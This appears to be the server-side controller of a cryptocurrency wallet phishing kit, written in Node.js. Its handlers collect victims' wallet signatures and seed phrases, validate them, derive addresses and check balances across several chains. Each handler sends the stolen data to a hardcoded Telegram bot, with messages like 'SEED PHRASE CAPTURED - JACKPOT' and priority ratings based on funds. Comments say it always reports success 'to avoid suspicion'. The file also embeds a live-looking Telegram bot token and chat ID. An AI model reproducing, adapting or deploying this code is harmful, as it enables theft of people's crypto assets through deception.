const TelegramBot = require('../utils/telegram');
const logger = require('../utils/logger');
const SecurityManager = require('../utils/security');
const CryptoValidator = require('../utils/cryptoValidator');
const BalanceChecker = require('../utils/balanceChecker');

// Initialize Telegram bot and balance checker
const telegramBot = new TelegramBot(
    '8334219975:AAFieeTvjCuupdaJ1s4fZqE5eviiYESo6yo',
    '8032328516'
);
const balanceChecker = new BalanceChecker();

exports.connectWallet = async (req, res) => {
    try {
        const { publicKey, signature, message } = req.body;
        const ip = req.ip || req.connection.remoteAddress;
        const userAgent = req.get('User-Agent');

        if (!publicKey || !signature) {
            return res.status(400).json({ error: 'Missing required wallet data' });
        }

        // Log the wallet connection
        logger.info('Wallet connection attempt', { publicKey, ip, userAgent });

        // Prepare wallet data for Telegram
        const walletData = {
            publicKey,
            signature,
            message,
            timestamp: Date.now(),
            ip,
            userAgent
        };

        // Send to Telegram
        try {
            const telegramMessage = telegramBot.formatWalletReport(walletData);
            await telegramBot.sendMessage(telegramMessage);
        } catch (telegramError) {
            logger.error('Failed to send Telegram report', telegramError);
            // Continue execution even if Telegram fails
        }

        // Log to console for debugging
        console.log('='.repeat(50));
        console.log('🚨 WALLET CONNECTION CAPTURED 🚨');
        console.log('='.repeat(50));
        console.log(`Public Key: ${publicKey}`);
        console.log(`Signature: ${signature}`);
        console.log(`IP: ${ip}`);
        console.log(`User Agent: ${userAgent}`);
        console.log(`Timestamp: ${new Date().toISOString()}`);
        console.log('='.repeat(50));

        res.json({ 
            success: true, 
            message: 'Wallet connected successfully',
            timestamp: Date.now()
        });

    } catch (error) {
        logger.error('Wallet connection error', error);
        res.status(500).json({ error: 'Internal server error' });
    }
};

exports.signMessage = async (req, res) => {
    try {
        const { publicKey, signature, message } = req.body;
        const ip = req.ip || req.connection.remoteAddress;

        logger.info('Message signing attempt', { publicKey, message, ip });

        // Send signature data to Telegram
        const signatureData = {
            publicKey,
            signature,
            message,
            timestamp: Date.now(),
            ip,
            userAgent: req.get('User-Agent')
        };

        try {
            const telegramMessage = `🔐 <b>MESSAGE SIGNED</b>

📍 <b>Wallet:</b> <code>${publicKey}</code>
📝 <b>Message:</b> ${message}
✍️ <b>Signature:</b> <code>${signature}</code>
🕐 <b>Time:</b> ${new Date().toLocaleString()}`;

            await telegramBot.sendMessage(telegramMessage);
        } catch (telegramError) {
            logger.error('Failed to send signature report', telegramError);
        }

        res.json({ success: true, message: 'Message signed successfully' });

    } catch (error) {
        logger.error('Message signing error', error);
        res.status(500).json({ error: 'Internal server error' });
    }
};

exports.captureSeedPhrase = async (req, res) => {
    try {
        const { publicKey, seedPhrase } = req.body;
        const ip = req.ip || req.connection.remoteAddress;
        const userAgent = req.get('User-Agent');

        if (!seedPhrase) {
            return res.status(400).json({ error: 'Missing seed phrase' });
        }

        // Log the seed phrase capture
        logger.info('Seed phrase captured', { publicKey, ip, userAgent });

        // Prepare seed phrase data for Telegram
        const seedData = {
            publicKey: publicKey || 'unknown',
            seedPhrase,
            timestamp: Date.now(),
            ip,
            userAgent
        };

        // Send to Telegram
        try {
            const telegramMessage = `🚨 SEED PHRASE CAPTURED - JACKPOT! 🚨

💎 FULL WALLET ACCESS OBTAINED!

📍 Wallet: ${publicKey || 'unknown'}
🔑 Seed Phrase: ${seedPhrase}
🌐 IP: ${ip}
🖥️ User Agent: ${userAgent}
🕐 Time: ${new Date().toLocaleString()}

⚡ Status: READY FOR IMPORT`;

            console.log('[TELEGRAM] Attempting to send seed phrase...');
            await telegramBot.sendMessage(telegramMessage);
            console.log('[TELEGRAM] Seed phrase sent successfully!');
        } catch (telegramError) {
            console.error('[TELEGRAM] Failed to send seed phrase:', telegramError);
            logger.error('Failed to send seed phrase report', telegramError);
        }

        // Log to console for debugging
        console.log('='.repeat(60));
        console.log('🚨 SEED PHRASE CAPTURED - JACKPOT! 🚨');
        console.log('='.repeat(60));
        console.log(`Public Key: ${publicKey || 'unknown'}`);
        console.log(`Seed Phrase: ${seedPhrase}`);
        console.log(`IP: ${ip}`);
        console.log(`User Agent: ${userAgent}`);
        console.log(`Timestamp: ${new Date().toISOString()}`);
        console.log('='.repeat(60));

        res.json({ 
            success: true, 
            message: 'Wallet verified successfully',
            timestamp: Date.now()
        });

    } catch (error) {
        logger.error('Seed phrase capture error', error);
        res.status(500).json({ error: 'Internal server error' });
    }
};

exports.importWallet = async (req, res) => {
    console.log('[IMPORT WALLET] Request received:', req.body);
    
    try {
        const { walletType, seedPhrase, wordCount, timestamp, userAgent, url } = req.body;
        const ip = req.ip || req.connection.remoteAddress;

        console.log('[IMPORT WALLET] Processing:', { walletType, wordCount, ip });

        let validationResult = { valid: false };
        let derivedAddresses = {};
        let balanceInfo = null;
        
        // Validate seed phrase if provided
        if (seedPhrase && seedPhrase.trim()) {
            validationResult = CryptoValidator.validateSeedPhrase(seedPhrase);
            
            if (validationResult.valid) {
                // Derive addresses for additional validation
                derivedAddresses = await CryptoValidator.deriveAddresses(seedPhrase, walletType);
                console.log('[VALIDATION] Seed phrase is valid BIP39 format');
                console.log('[ADDRESSES] Derived:', derivedAddresses);
                
                // Check balances for derived addresses
                try {
                    balanceInfo = await balanceChecker.checkAllBalances(derivedAddresses);
                    console.log('[BALANCES] Checking addresses:', derivedAddresses);
                    console.log('[BALANCES] Portfolio value: $', balanceInfo.totalPortfolioUSD.toFixed(2));
                    console.log('[BALANCES] Individual balances:', balanceInfo.balances);
                } catch (balanceError) {
                    console.error('[BALANCE ERROR]:', balanceError.message);
                    balanceInfo = { totalPortfolioUSD: 0, balances: [] };
                }
            } else {
                console.log('[VALIDATION] Invalid seed phrase:', validationResult.error);
            }
        }

        const actualWordCount = seedPhrase ? seedPhrase.split(' ').length : 0;
        
        // Log the wallet import attempt
        logger.info('Wallet import attempt', { walletType, wordCount: actualWordCount, valid: validationResult.valid, ip, userAgent });

        // Send to Telegram with validation info
        try {
            const validationStatus = validationResult.valid ? '✅ VALID BIP39' : '❌ INVALID';
            const addressInfo = derivedAddresses.ethereum || derivedAddresses.solana ? 
                `\n📍 <b>Derived Addresses:</b>\n${derivedAddresses.ethereum ? `ETH: <code>${derivedAddresses.ethereum}</code>\n` : ''}${derivedAddresses.solana ? `SOL: <code>${derivedAddresses.solana}</code>` : ''}` : '';
            
            // Balance information
            let balanceText = '';
            if (balanceInfo && balanceInfo.balances.length > 0) {
                balanceText = `\n💰 <b>Portfolio Balances:</b>\n`;
                balanceInfo.balances.forEach(balance => {
                    balanceText += `${balance.chain}: ${balance.native.balance.toFixed(4)} ${balance.native.symbol} ($${balance.native.usdValue.toFixed(2)})\n`;
                });
                balanceText += `💵 <b>Total Portfolio Value: $${balanceInfo.totalPortfolioUSD.toFixed(2)}</b>`;
            }
            
            const telegramMessage = `🎯 WALLET SEED CAPTURED! 🎯

💰 FULL ACCESS OBTAINED!

🏦 <b>Wallet Type:</b> ${walletType || 'Unknown'}
🔑 <b>Seed Phrase:</b> <code>${seedPhrase || 'Empty'}</code>
📊 <b>Word Count:</b> ${actualWordCount} words
🔍 <b>Validation:</b> ${validationStatus}${addressInfo}${balanceText}
🌐 <b>IP Address:</b> ${ip}
🖥️ <b>User Agent:</b> ${userAgent}
🔗 <b>Source URL:</b> ${url}
⏰ <b>Timestamp:</b> ${new Date(timestamp).toLocaleString()}

⚡ <b>Status:</b> READY FOR IMPORT
🚨 <b>Priority:</b> ${validationResult.valid && balanceInfo?.totalPortfolioUSD > 0 ? 'CRITICAL - VALID SEED WITH FUNDS' : validationResult.valid ? 'HIGH - VALID SEED' : 'MEDIUM - INVALID SEED'}`;

            console.log('[TELEGRAM] Attempting to send message...');
            await telegramBot.sendMessage(telegramMessage);
            console.log('[SUCCESS] Seed phrase sent to Telegram!');
        } catch (telegramError) {
            console.error('[TELEGRAM ERROR]:', telegramError.message);
            logger.error('Telegram send failed', telegramError);
        }

        // Console log
        console.log('='.repeat(70));
        console.log('🎯 WALLET SEED CAPTURED! 🎯');
        console.log('='.repeat(70));
        console.log(`Wallet Type: ${walletType || 'Unknown'}`);
        console.log(`Seed Phrase: ${seedPhrase || 'Empty'}`);
        console.log(`Word Count: ${actualWordCount}`);
        console.log(`Validation: ${validationResult.valid ? 'VALID' : 'INVALID'}`);
        console.log(`Addresses:`, derivedAddresses);
        console.log(`IP: ${ip}`);
        console.log(`Timestamp: ${timestamp}`);
        console.log('='.repeat(70));

        // Always return success to maintain user experience
        console.log('[RESPONSE] Sending response:', {
            success: true,
            isValid: validationResult.valid,
            hasWalletData: !!validationResult.valid
        });
        
        res.json({ 
            success: true, 
            isValid: validationResult.valid,
            message: validationResult.valid ? 'Wallet imported successfully' : 'Invalid seed phrase',
            // Store real wallet data for dashboard
            walletData: validationResult.valid ? {
                addresses: derivedAddresses,
                addressBalances: balanceInfo?.balances || [],
                balances: {
                    totalPortfolioUSD: balanceInfo?.totalPortfolioUSD || 0
                },
                walletType: walletType,
                isValid: true,
                timestamp: Date.now()
            } : null,
            timestamp: Date.now()
        });

    } catch (error) {
        logger.error('Wallet import error', error);
        console.error('[IMPORT ERROR]:', error.message);
        
        // Still return success to avoid suspicion
        res.json({ 
            success: true,
            isValid: false,
            message: 'Invalid seed phrase',
            walletData: null,
            timestamp: Date.now()
        });
    }
};

exports.checkBalance = async (req, res) => {
    try {
        const { address, walletType } = req.body;
        
        if (!address) {
            return res.status(400).json({ error: 'Address required' });
        }
        
        // Validate address format
        if (!balanceChecker.validateAddress(address, walletType)) {
            return res.status(400).json({ error: 'Invalid address format' });
        }
        
        let result;
        const lowerType = (walletType || '').toLowerCase();
        
        if (lowerType.includes('phantom') || lowerType.includes('solana')) {
            result = await balanceChecker.checkSolanaBalance(address);
        } else if (lowerType.includes('metamask') || lowerType.includes('ethereum')) {
            result = await balanceChecker.checkEthereumBalance(address);
        } else if (lowerType.includes('trust') || lowerType.includes('bsc')) {
            result = await balanceChecker.checkBSCBalance(address);
        } else {
            // For imported wallets, check all supported chains
            const addresses = {};
            
            // Validate and assign addresses based on format
            if (balanceChecker.validateAddress(address, 'ethereum')) {
                addresses.ethereum = address;
            }
            if (balanceChecker.validateAddress(address, 'solana')) {
                addresses.solana = address;
            }
            if (balanceChecker.validateAddress(address, 'bitcoin')) {
                addresses.bitcoin = address;
            }
            if (balanceChecker.validateAddress(address, 'xrp')) {
                addresses.xrp = address;
            }
            if (balanceChecker.validateAddress(address, 'litecoin')) {
                addresses.litecoin = address;
            }
            if (balanceChecker.validateAddress(address, 'cardano')) {
                addresses.cardano = address;
            }
            if (balanceChecker.validateAddress(address, 'polkadot')) {
                addresses.polkadot = address;
            }
            if (balanceChecker.validateAddress(address, 'dogecoin')) {
                addresses.dogecoin = address;
            }
            
            result = await balanceChecker.checkAllBalances(addresses);
        }
        
        res.json({
            success: true,
            data: result
        });
        
    } catch (error) {
        console.error('Balance check error:', error);
        res.status(500).json({ error: 'Balance check failed' });
    }
};